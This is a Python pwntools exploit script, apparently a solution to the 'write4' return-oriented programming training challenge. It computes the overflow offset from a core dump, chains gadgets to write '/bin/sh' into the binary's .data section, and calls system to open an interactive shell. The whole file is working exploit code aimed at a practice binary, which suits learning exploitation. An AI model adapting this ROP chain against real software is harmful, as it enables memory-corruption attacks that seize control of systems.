#!/usr/bin/env python2

from pwn import *



elf = context.binary = ELF('write4')

#context.log_level = 'debug'
p = process(elf.path)

PopR14R15 = 0x0000000000400890
MoveR15intoR14 = 0x0000000000400820
PopRDI = 0x0000000000400893
systemFunctionAddress = 0x0000000000400810
dataAddress = 0x00601050

info("Address SystemFunction: %x\nAddress .data (Address to write into): %x\nAddress pop R14 and R15: %x\nAddress move R15 to R14: %x\nAddress pop rdi: %x\n",systemFunctionAddress,dataAddress,PopR14R15,MoveR15intoR14,PopRDI)

#send a pattern to calculate the offset
p.sendline(cyclic(70))


#wait for crashing
p.wait()

core = p.corefile
#calculates the correct offset to the return address
offset = core.read(core.rsp,4)
offset = cyclic_find(offset)

pattern = cyclic(offset)
info("offset: %d",len(pattern))

payload = pattern

#we first pop the address into R14 and the string that we want ("/bin/sh\x00") \x00 to know when the string is over

payload += p64(PopR14R15) #address of the gadget pop R14, pop R15
payload += p64(dataAddress) #address of the data section we want to write into
payload += "/bin/sh\x00"  #string to spawn the shell

#then we write into the section we want
payload += p64(MoveR15intoR14) #address of the gadget move R15 to R14

#then we call the system function
payload += p64(PopRDI) #address of the gadget pop RDI
payload += p64(dataAddress) #address where we store the string
payload += p64(systemFunctionAddress) #address of the system function (RDI will pass as argument)

info("Final payload: %s\nLenght of the payload: %d",payload,len(payload))

#new process to send the payload
p = process(elf.path)
p.sendlineafter("!",payload)

p.interactive()




